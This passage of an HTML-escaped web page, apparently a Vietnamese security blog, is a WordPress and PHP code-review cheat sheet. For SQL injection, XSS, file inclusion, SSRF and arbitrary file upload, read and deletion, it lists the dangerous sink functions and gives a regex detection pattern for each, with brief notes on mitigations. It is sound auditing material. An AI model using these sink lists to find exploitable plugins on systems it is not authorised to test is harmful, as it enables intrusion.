noreferrer&#34;&gt;&lt;code&gt;$wpdb-&amp;gt;get_var&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/classes/wpdb/get_row/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;$wpdb-&amp;gt;get_row&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/classes/wpdb/get_col/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;$wpdb-&amp;gt;get_col&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/classes/wpdb/get_results/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;$wpdb-&amp;gt;get_results&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;\$wpdb-&amp;gt;\s*(query|get_(var|row|col|results))\s*&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;alert alert-note&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z&#34;/&gt;&lt;/svg&gt;Ghi ch√∫&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Magic Quotes&lt;/strong&gt; l√† t√≠nh nƒÉng PHP t·ª± ƒë·ªông escape k√Ω t·ª± ƒë·∫∑c bi·ªát (&lt;code&gt;&#39;&lt;/code&gt;, &lt;code&gt;&amp;quot;&lt;/code&gt;, &lt;code&gt;\&lt;/code&gt;, NULL) trong d·ªØ li·ªáu ƒë·∫ßu v√†o ƒë·ªÉ gi·∫£m nguy c∆° SQL Injection. N√≥ kh√¥ng ho√†n h·∫£o, ch·ªâ escape m·ªôt s·ªë k√Ω t·ª± v√† PHP ƒë√£ t·∫Øt m·∫∑c ƒë·ªãnh. WordPress v·∫´n d√πng c∆° ch·∫ø n√†y qua &lt;code&gt;wp_magic_quotes()&lt;/code&gt; v√† &lt;code&gt;add_magic_quotes()&lt;/code&gt; ƒë·ªÉ t·ª± ƒë·ªông x·ª≠ l√Ω &lt;code&gt;$_GET&lt;/code&gt;, &lt;code&gt;$_POST&lt;/code&gt;, &lt;code&gt;$_COOKIE&lt;/code&gt;, &lt;code&gt;$_SERVER&lt;/code&gt;, nh∆∞ng developer n√™n d√πng c√°c bi·ªán ph√°p chu·∫©n nh∆∞ &lt;code&gt;$wpdb-&amp;gt;prepare()&lt;/code&gt; ƒë·ªÉ ch·ªëng SQLi.&lt;/p&gt;&lt;/div&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;cross-site-scripting-xss&#34;&gt;&lt;span&gt;Cross-Site Scripting (XSS)&lt;/span&gt;&#xA;  &lt;a href=&#34;#cross-site-scripting-xss&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/functions/add_shortcode/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;add_shortcode&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/functions/register_block_type/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;register_block_type &lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;elementor/widgets/register &lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;render&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;\b(add_shortcode|register_block_type|elementor/widgets/register|render|print|echo|innerHTML|outerHTML|document\.write)\b&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;local-file-inclusion-lfi&#34;&gt;&lt;span&gt;Local File Inclusion (LFI)&lt;/span&gt;&#xA;  &lt;a href=&#34;#local-file-inclusion-lfi&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.include.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;include&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.include-once.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;include_once&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.require.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;require&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.require-once.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;require_once&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;\b(include|require)(_once)?\b&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;alert alert-note&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z&#34;/&gt;&lt;/svg&gt;Ghi ch√∫&lt;/p&gt;&lt;p&gt;Remote File Inclusion (RFI) x·∫£y ra khi ·ª©ng d·ª•ng PHP cho ph√©p &lt;code&gt;include&lt;/code&gt;/&lt;code&gt;require&lt;/code&gt; m·ªôt t·∫≠p tin t·ª´ URL do ng∆∞·ªùi d√πng ki·ªÉm so√°t ‚Äî ƒëi·ªÅu ki·ªán th∆∞·ªùng l√† &lt;code&gt;allow_url_fopen&lt;/code&gt; v√† &lt;code&gt;allow_url_include&lt;/code&gt; b·∫≠t ‚Äî d·∫´n t·ªõi vi·ªác t·∫£i v√† th·ª±c thi m√£ PHP t·ª´ m√°y ch·ªß t·ª´ xa, g√¢y &lt;strong&gt;remote code execution&lt;/strong&gt;. NgƒÉn ch·∫∑n b·∫±ng c√°ch t·∫Øt &lt;code&gt;allow_url_include&lt;/code&gt;, kh√¥ng d√πng input tr·ª±c ti·∫øp trong include/require, v√† √°p whitelist/normalize ƒë∆∞·ªùng d·∫´n.&lt;/p&gt;&lt;/div&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;server-side-request-forgery-ssrf&#34;&gt;&lt;span&gt;Server Side Request Forgery (SSRF)&lt;/span&gt;&#xA;  &lt;a href=&#34;#server-side-request-forgery-ssrf&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;PHP related&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.file-get-contents.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;file_get_contents&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.readfile.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;readfile&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.fopen.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;fopen&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.stream-get-contents.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;stream_get_contents&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.file.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;file&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.curl-exec.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;curl_exec&lt;/code&gt; / &lt;code&gt;cURL&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;\b(file_get_contents|readfile|fopen|stream_get_contents|curl_exec|curl_init|curl_setopt|curl_multi_exec)\b&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;WordPress related&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/functions/wp_remote_head/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;wp_remote_head&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/functions/wp_remote_get/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;wp_remote_get&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/functions/wp_remote_post/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;wp_remote_post&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/functions/wp_remote_request/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;wp_remote_request&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;\bwp_remote_(head|get|post|request)\b&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;arbitrary-file-upload&#34;&gt;&lt;span&gt;Arbitrary File Upload&lt;/span&gt;&#xA;  &lt;a href=&#34;#arbitrary-file-upload&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;PHP related&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.move-uploaded-file.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;move_uploaded_file&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.file-put-contents.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;file_put_contents&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.fwrite.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;fwrite&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.fputs.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;fputs&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.copy.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;copy&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.fputcsv.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;fputcsv&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.rename.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;rename&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/ziparchive.extractto.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;ZipArchive::extractTo&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/phardata.extractto.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;PharData::extractTo&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/functions/unzip_file/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;unzip_file&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;\b(move_uploaded_file|file_put_contents|fwrite|fputs|copy|fputcsv|rename|ZipArchive::extractTo|PharData::extractTo|unzip_file)\b&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;WordPress related&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/classes/wp_filesystem_direct/#method-put_contents&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;WP_Filesystem_Direct::put_contents&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/classes/wp_filesystem_direct/#method-move&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;WP_Filesystem_Direct::move&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/classes/wp_filesystem_direct/#method-copy&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;WP_Filesystem_Direct::copy&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/functions/wp_handle_upload/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;wp_handle_upload()&lt;/code&gt; with &lt;code&gt;test_type =&amp;gt; false&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;\b(WP_Filesystem_Direct::put_contents|WP_Filesystem_Direct::move|WP_Filesystem_Direct::copy|wp_handle_upload)\b&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;arbitrary-file-read&#34;&gt;&lt;span&gt;Arbitrary File Read&lt;/span&gt;&#xA;  &lt;a href=&#34;#arbitrary-file-read&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;PHP related&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.file-get-contents.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;file_get_contents&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.readfile.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;readfile&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.fopen.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;fopen&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.fread.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;fread&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.fgets.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;fgets&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.fgetcsv.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;fgetcsv&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.fgetss.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;fgetss&lt;/code&gt; (deprecated from PHP 7.3)&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.file.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;file&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.curl-exec.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;curl_exec&lt;/code&gt; / cURL&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;\b(file_get_contents|readfile|fopen|fread|fgets|fgetcsv|fgetss|curl_exec)\b&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;WordPress related&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/classes/wp_filesystem_direct/#method-get_contents&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;WP_Filesystem_Direct::get_contents&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/classes/wp_filesystem_direct/#method-get_contents-array&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;WP_Filesystem_Direct::get_contents_array&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;\b(WP_Filesystem_Direct::get_contents|WP_Filesystem_Direct::get_contents_array)\b&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;arbitrary-file-deletion&#34;&gt;&lt;span&gt;Arbitrary File Deletion&lt;/span&gt;&#xA;  &lt;a href=&#34;#arbitrary-file-deletion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;PHP related&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.unlink.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;unlink&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function/rmdir.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;rmdir&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;\b(unlink|rmdir)\b&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;WordPress related&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/functions/wp_delete_file/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener 